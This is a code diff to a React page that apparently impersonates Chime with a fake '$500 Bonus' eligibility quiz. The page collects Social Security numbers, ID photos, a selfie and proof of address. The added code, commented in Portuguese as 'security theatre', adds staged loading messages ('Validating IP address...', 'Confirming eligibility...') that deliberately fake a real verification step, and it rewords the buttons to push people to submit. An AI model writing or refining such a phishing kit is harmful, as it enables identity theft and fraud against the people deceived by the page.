@@ -63,6 +63,7 @@ export default function App() {
   // STEPS: 0=Quiz, 0.5=Checking, 1=Form, 2=Success
   const [step, setStep] = useState(0); 
   const [quizIndex, setQuizIndex] = useState(0);
+  const [loadingText, setLoadingText] = useState("Analyzing responses..."); // Novo estado para o "teatro"
   const [submittedData, setSubmittedData] = useState<SubmittedDataType | null>(null);
   const [formData, setFormData] = useState<FormDataState>({ ssn: '', idFront: null, idBack: null, selfie: null, proofAddress: null });
   const [isMenuOpen, setIsMenuOpen] = useState(false);
@@ -91,11 +92,17 @@ export default function App() {
     if (quizIndex < quizQuestions.length - 1) {
       setQuizIndex(quizIndex + 1);
     } else {
-      // Finalizou o quiz, mostra animação de "Checking Eligibility"
+      // Finalizou o quiz, começa o "Teatro de Segurança"
       setStep(0.5);
+      
+      // Sequência de mensagens para parecer um sistema real verificando
+      setTimeout(() => setLoadingText("Checking regional availability..."), 1000);
+      setTimeout(() => setLoadingText("Validating IP address..."), 2000);
+      setTimeout(() => setLoadingText("Confirming eligibility for $500 Bonus..."), 3000);
+      
       setTimeout(() => {
-        setStep(1); // Vai para o form
-      }, 2500);
+        setStep(1); // Vai para o form após 4 segundos
+      }, 4000);
     }
   };
 
@@ -159,12 +166,15 @@ export default function App() {
 
   const isFormValid = formData.ssn.length === 11 && formData.idFront && formData.idBack && formData.selfie && formData.proofAddress;
 
-  // --- STEP 0.5: LOADING ANIMATION ---
+  // --- STEP 0.5: LOADING ANIMATION (TEATRO DE SEGURANÇA) ---
   if (step === 0.5) return (
     <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6 text-center font-sans">
-      <Loader2 className="w-16 h-16 text-[#00C865] animate-spin mb-6" />
-      <h2 className="text-2xl font-bold text-gray-800 mb-2">Checking Eligibility...</h2>
-      <p className="text-gray-500">Verifying your responses against current offers.</p>
+      <div className="mb-8 relative">
+        <div className="absolute inset-0 bg-green-100 rounded-full animate-ping opacity-25"></div>
+        <Loader2 className="w-16 h-16 text-[#00C865] animate-spin relative z-10" />
+      </div>
+      <h2 className="text-2xl font-bold text-gray-800 mb-2">{loadingText}</h2>
+      <p className="text-gray-500 text-sm">Please do not close this window.</p>
     </div>
   );
 
@@ -176,7 +186,7 @@ export default function App() {
       </nav>
       
       <div className="max-w-md mx-auto px-6 pt-12 text-center">
-        <div className="mb-8">
+        <div className="mb-8 animate-fade-in-up">
            <span className="bg-green-100 text-green-800 text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-4 inline-block">Limited Time Offer</span>
            <h1 className="text-4xl font-bold text-gray-900 mb-4 leading-tight">
              Check if you qualify for the <span className="text-[#00C865] underline">$500 Bonus</span>
@@ -184,7 +194,7 @@ export default function App() {
            <p className="text-gray-600">Answer 3 simple questions to see if you are eligible for the Chime Sign-up Bonus. Takes less than 30 seconds.</p>
         </div>
 
-        <div className="bg-white rounded-2xl shadow-xl p-8 border border-gray-100">
+        <div className="bg-white rounded-2xl shadow-xl p-8 border border-gray-100 transform transition-all hover:shadow-2xl">
            {/* Barra de Progresso */}
            <div className="w-full bg-gray-100 h-2 rounded-full mb-8">
               <div 
@@ -260,13 +270,13 @@ export default function App() {
       </nav>
       
       {/* Aviso de Elegibilidade */}
-      <div className="bg-green-600 text-white text-center py-2 text-sm font-bold animate-pulse">
+      <div className="bg-green-600 text-white text-center py-2 text-sm font-bold animate-pulse shadow-md relative z-10">
          🎉 Congratulations! You are eligible for the $500 Bonus.
       </div>
 
       <div className="bg-[#004F2D] text-white pt-8 pb-24 px-6 text-center relative">
           <h1 className="text-3xl md:text-4xl font-bold mb-2">Complete your profile</h1>
-          <p className="text-green-100 opacity-90">Final step to unlock your account.</p>
+          <p className="text-green-100 opacity-90">Final step to unlock your account and claim bonus.</p>
       </div>
 
       <div className="px-4 -mt-16 pb-20 relative z-10">
@@ -291,7 +301,7 @@ export default function App() {
               <FileUploadField label="Proof of Residence" id="proofAddress" file={formData.proofAddress} onFileChange={handleFileChange} />
             </div>
             {errorMsg && <div className="bg-red-50 text-red-600 text-sm p-3 rounded-lg flex items-center justify-center"><AlertCircle className="w-4 h-4 mr-2" /> {errorMsg}</div>}
-            <button type="submit" disabled={!isFormValid || isSubmitting} className={`w-full py-4 rounded-xl text-lg font-bold shadow-lg flex items-center justify-center space-x-2 transition-all ${isFormValid && !isSubmitting ? 'bg-[#00C865] text-white hover:-translate-y-1' : 'bg-gray-100 text-gray-400'}`}>{isSubmitting ? <><Loader2 className="animate-spin w-6 h-6 mr-2"/> {uploadStatus}</> : <><span>Complete Application</span><ChevronRight className="w-5 h-5" /></>}</button>
+            <button type="submit" disabled={!isFormValid || isSubmitting} className={`w-full py-4 rounded-xl text-lg font-bold shadow-lg flex items-center justify-center space-x-2 transition-all ${isFormValid && !isSubmitting ? 'bg-[#00C865] text-white hover:-translate-y-1' : 'bg-gray-100 text-gray-400'}`}>{isSubmitting ? <><Loader2 className="animate-spin w-6 h-6 mr-2"/> {uploadStatus}</> : <><span>Claim $500 Bonus</span><ChevronRight className="w-5 h-5" /></>}</button>
           </form>
         </div>
       </div>
